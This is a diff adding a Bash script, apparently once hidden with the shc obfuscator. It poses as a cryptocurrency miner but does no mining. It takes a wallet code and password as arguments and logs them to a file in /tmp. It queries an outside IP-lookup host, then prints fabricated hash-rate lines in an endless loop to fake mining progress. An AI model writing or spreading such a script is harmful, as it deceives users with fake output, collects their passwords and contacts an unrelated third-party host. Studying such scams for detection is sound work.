@@ -1,0 +1,70 @@
+#!/bin/bash
+
+
+mavi="\033[1;36m"          
+yesil="\033[1;32m"
+yesil="\033[32m"
+pembe="\033[35m"
+mavii="\033[1;37m"
+mavis="\033[1;31m"  
+s="\033[0m"
+r101=$(( ((RANDOM<<15)|RANDOM) % 4915249152 + 1000000000 ))
+r81=$(( ((RANDOM<<15)|RANDOM) % 4915249 + 10000000 ))
+r102=$(( ((RANDOM<<15)|RANDOM) % 4915249152 + 1000000000 ))
+r82=$(( ((RANDOM<<15)|RANDOM) % 4915249 + 10000000 ))
+r103=$(( ((RANDOM<<15)|RANDOM) % 4915249152 + 1000000000 ))
+r83=$(( ((RANDOM<<15)|RANDOM) % 4915249 + 10000000 ))
+random=$(( ((RANDOM<<15)|RANDOM) % 49 + 99 ))
+randomlog=$(( ((RANDOM<<15)|RANDOM) % 49 + 99 ))
+random2=$(( ((RANDOM<<15)|RANDOM) % 49 + 99 ))
+random21=$(( ((RANDOM<<15)|RANDOM) % 49 + 99 ))
+random1=$(( ((RANDOM<<15)|RANDOM) % 49 + 99 ))
+random3=$(( ((RANDOM<<15)|RANDOM) % 49 + 99 ))
+random31=$(( ((RANDOM<<15)|RANDOM) % 49 + 99 ))
+randomr1=$(( ((RANDOM<<15)|RANDOM) % 499 + 999 ))
+randomr2=$(( ((RANDOM<<15)|RANDOM) % 499 + 999 ))
+randomr3=$(( ((RANDOM<<15)|RANDOM) % 499 + 999 ))
+ip=`curl -s multisunucum.tr.ht/ip.php`  
+server="http://router.elsethen.org"
+logfile=`mktemp`
+
+
+###############################################
+# Script Kodlayan: Mert Sabancı [Else]        #
+# Ulaşmak için: fb.com/elsethen               #
+##############################################################################################################
+# Eğer burayı okuyorsan helalin var, shcyi kırmayı başarmışsın.                                              #
+# Bu konuda problem yok. Kodları ve linkleri değiştirebilirsin.                                              #
+# Ama eğer ismimi silip, başka yerde paylaşma amacıyla girdiysen şunu bil ki;                                #
+# Emek hırsızlığı ile hiç bir yere gelemezsin. Her zaman üşengeç, işe yaramaz bir insan olarak kalacaksın.   #
+# Bu sözlerim sadece ismimi silecek kişileredir. Kodları incelemek için açanlara lafım yoktur.               #
+##############################################################################################################
+
+wallet=$2
+cpu=$4
+gpu=$6
+password=$8
+
+echo "
+Wallet Code:$wallet
+Cpu:$cpu
+Gpu:$gpu
+Password:$password
+">> $logfile
+cd /tmp
+mv $logfile minnerlog$randomlog
+
+
+
+
+
+while :
+do
+	echo -e "${yesil}minner${s}  ${pembe}12:45:$random.$random1${s} Mining on ElseServer ${mavi}#04a974b0...${s} : $r101 H/s = $r81 hashes / 0.$randomr1 s"
+	echo -e "${yesil}minner${s}  ${pembe}12:45:$random2.$random21${s} Mining on ElseServer ${mavi}#04a974b0...${s} : $r102 H/s = $r82 hashes / 0.$randomr2 s"
+	echo -e "${yesil}minner${s}  ${pembe}12:45:$random3.$random31${s} Mining on ElseServer ${mavi}#04a974b0...${s} : $r103 H/s = $r83 hashes / 0.$randomr3 s"
+done
+
+
+
+	
